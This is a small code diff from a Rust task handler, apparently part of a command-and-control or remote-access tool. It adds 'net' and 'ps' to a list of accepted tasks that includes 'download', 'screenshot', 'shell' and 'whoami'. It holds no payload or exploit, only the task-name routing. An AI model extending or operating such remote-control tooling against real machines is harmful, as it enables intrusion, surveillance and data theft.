@@ -31,8 +31,8 @@ pub async fn handle_task(
     let task = args[2].as_str();
 
     match task {
-        "cat" | "cd" | "download" | "info" | "ls" | "pwd" | "rm" | "screenshot" |
-        "shell" | "sleep" | "whoami" => {
+        "cat" | "cd" | "download" | "info" | "ls" | "net" | "ps" | "pwd" |
+        "rm" | "screenshot" | "shell" | "sleep" | "whoami" => {
             match set_task(&args) {
                 Ok(_) => {},
                 Err(e) => {
